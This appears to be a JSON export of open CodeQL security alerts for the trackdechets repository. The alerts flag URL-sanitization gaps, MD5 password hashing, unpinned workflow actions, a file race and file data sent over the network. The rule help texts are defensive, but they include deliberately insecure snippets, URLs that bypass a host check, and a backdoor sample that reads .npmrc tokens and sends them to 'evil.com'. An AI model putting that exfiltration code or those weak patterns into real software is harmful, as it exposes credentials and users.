{"totalCount":9,"grade":"D","repositories":[{"url":"https://github.com/MTES-MCT/trackdechets","grade":"D","alerts":[{"number":266,"created_at":"2025-09-26T14:53:25Z","updated_at":"2025-10-10T14:29:07Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/266","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/266","assignees":[],"state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/incomplete-url-substring-sanitization","severity":"warning","description":"Incomplete URL substring sanitization","name":"js/incomplete-url-substring-sanitization","tags":["correctness","external/cwe/cwe-020","security"],"full_description":"Security checks on the substrings of an unparsed URL are often vulnerable to bypassing.","help":"# Incomplete URL substring sanitization\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nHowever, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.\n\nEven if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.\n\n\n## Recommendation\nParse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThe substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\"),\n        host = urlLib.parse(url).host;\n    // BAD: the host of `url` may be controlled by an attacker\n    if (host.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThis is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param('url'),\n        host = urlLib.parse(url).host;\n    // GOOD: the host of `url` can not be controlled by an attacker\n    let allowedHosts = [\n        'example.com',\n        'beta.example.com',\n        'www.example.com'\n    ];\n    if (allowedHosts.includes(host)) {\n        res.redirect(url);\n    }\n});\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.23.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"e997b02382c0e3634da18740cba4a67bf161b84d","message":{"text":"'https://company1.fr' may be followed by an arbitrary host name."},"location":{"path":"back/src/queue/jobs/__tests__/sendHook.integration.ts","start_line":309,"end_line":309,"start_column":13,"end_column":50},"classifications":["test"]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/266/instances","dismissal_approved_by":null},{"number":265,"created_at":"2025-08-10T11:34:09Z","updated_at":"2025-08-10T11:34:09Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/265","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/265","assignees":[],"state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/insufficient-password-hash","severity":"warning","description":"Use of password hash with insufficient computational effort","name":"js/insufficient-password-hash","tags":["external/cwe/cwe-916","security"],"full_description":"Creating a hash of a password with low computational effort makes the hash vulnerable to password cracking attacks.","help":"# Use of password hash with insufficient computational effort\nStoring cryptographic hashes of passwords is standard security practice, but it is equally important to select the right hashing scheme. If an attacker obtains the hashed passwords of an application, the password hashing scheme should still prevent the attacker from easily obtaining the original cleartext passwords.\n\nA good password hashing scheme requires a computation that cannot be done efficiently. Standard hashing schemes, such as `md5` or `sha1`, are efficiently computable, and are therefore not suitable for password hashing.\n\n\n## Recommendation\nUse a secure password hashing scheme such as `bcrypt`, `scrypt`, `PBKDF2`, or `Argon2`.\n\n\n## Example\nIn the example below, the `md5` algorithm computes the hash of a password.\n\n\n```javascript\nconst crypto = require(\"crypto\");\nfunction hashPassword(password) {\n    var hasher = crypto.createHash('md5');\n    var hashed = hasher.update(password).digest(\"hex\"); // BAD\n    return hashed;\n}\n\n```\nThis is not secure, since the password can be efficiently cracked by an attacker that obtains the hash. A more secure scheme is to hash the password with the `bcrypt` algorithm:\n\n\n```javascript\nconst bcrypt = require(\"bcrypt\");\nfunction hashPassword(password, salt) {\n  var hashed = bcrypt.hashSync(password, salt); // GOOD\n  return hashed;\n}\n\n```\n\n## References\n* OWASP: [Password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.23.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"e997b02382c0e3634da18740cba4a67bf161b84d","message":{"text":"Password from an access to apiKey is hashed insecurely."},"location":{"path":"back/src/utils.ts","start_line":162,"end_line":162,"start_column":13,"end_column":18},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/265/instances","dismissal_approved_by":null},{"number":177,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/177","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/177","assignees":[],"state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"## Overview\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendation\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- GitHub Docs: [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.23.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"e997b02382c0e3634da18740cba4a67bf161b84d","message":{"text":"Unpinned 3rd party Action 'Send reviewable PRs to Mattermost' step Uses Step uses 'mattermost/action-mattermost-notify' with ref 'master', not a pinned commit hash"},"location":{"path":".github/workflows/mattermost.yml","start_line":24,"end_line":24,"start_column":15,"end_column":57},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/177/instances","dismissal_approved_by":null},{"number":176,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/176","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/176","assignees":[],"state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"## Overview\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendation\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- GitHub Docs: [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.23.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"e997b02382c0e3634da18740cba4a67bf161b84d","message":{"text":"Unpinned 3rd party Action 'Deploy Docs and Sentry Release on production' step Uses Step uses 'peaceiris/actions-gh-pages' with ref 'v3', not a pinned commit hash"},"location":{"path":".github/workflows/deploy.yml","start_line":58,"end_line":58,"start_column":15,"end_column":44},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/176/instances","dismissal_approved_by":null},{"number":175,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/175","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/175","assignees":[],"state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"## Overview\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendation\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- GitHub Docs: [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.23.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"e997b02382c0e3634da18740cba4a67bf161b84d","message":{"text":"Unpinned 3rd party Action 'Deploy Docs and Sentry Release on production' step Uses Step uses 'getsentry/action-release' with ref 'v3', not a pinned commit hash"},"location":{"path":".github/workflows/deploy.yml","start_line":30,"end_line":30,"start_column":15,"end_column":42},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/175/instances","dismissal_approved_by":null},{"number":174,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/174","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/174","assignees":[],"state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"## Overview\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendation\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- GitHub Docs: [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.23.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"e997b02382c0e3634da18740cba4a67bf161b84d","message":{"text":"Unpinned 3rd party Action 'Deploy Sentry Release on recette' step Uses Step uses 'getsentry/action-release' with ref 'v3', not a pinned commit hash"},"location":{"path":".github/workflows/deploy-recette.yml","start_line":32,"end_line":32,"start_column":15,"end_column":42},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/174/instances","dismissal_approved_by":null},{"number":173,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/173","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/173","assignees":[],"state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"## Overview\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendation\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- GitHub Docs: [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.23.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"e997b02382c0e3634da18740cba4a67bf161b84d","message":{"text":"Unpinned 3rd party Action 'Build & Test' step Uses Step uses 'nrwl/nx-set-shas' with ref 'v3', not a pinned commit hash"},"location":{"path":".github/workflows/build-and-test.yml","start_line":20,"end_line":20,"start_column":15,"end_column":34},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/173/instances","dismissal_approved_by":null},{"number":159,"created_at":"2024-10-14T12:27:13Z","updated_at":"2024-10-14T12:27:15Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/159","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/159","assignees":[],"state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/file-system-race","severity":"warning","description":"Potential file system race condition","name":"js/file-system-race","tags":["external/cwe/cwe-367","security"],"full_description":"Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.","help":"# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.23.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"e997b02382c0e3634da18740cba4a67bf161b84d","message":{"text":"The file may have changed since it was checked."},"location":{"path":"libs/back/scripts/src/generate.ts","start_line":39,"end_line":39,"start_column":3,"end_column":44},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/159/instances","dismissal_approved_by":null},{"number":158,"created_at":"2024-10-14T12:27:13Z","updated_at":"2024-10-14T12:27:15Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/158","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/158","assignees":[],"state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/file-access-to-http","severity":"warning","description":"File data in outbound network request","name":"js/file-access-to-http","tags":["external/cwe/cwe-200","security"],"full_description":"Directly sending file data in an outbound network request can indicate unauthorized information disclosure.","help":"# File data in outbound network request\nSending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.\n\n\n```javascript\nvar fs = require(\"fs\"),\n    https = require(\"https\");\n\nvar content = fs.readFileSync(\".npmrc\", \"utf8\");\nhttps.get({\n  hostname: \"evil.com\",\n  path: \"/upload\",\n  method: \"GET\",\n  headers: { Referer: content }\n}, () => { });\n\n```\n\n## References\n* ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).\n* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.23.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"e997b02382c0e3634da18740cba4a67bf161b84d","message":{"text":"Outbound network request depends on file data.\nOutbound network request depends on file data."},"location":{"path":"back/src/common/post/backends/mysendingbox/index.ts","start_line":15,"end_line":15,"start_column":7,"end_column":13},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/158/instances","dismissal_approved_by":null}]}]}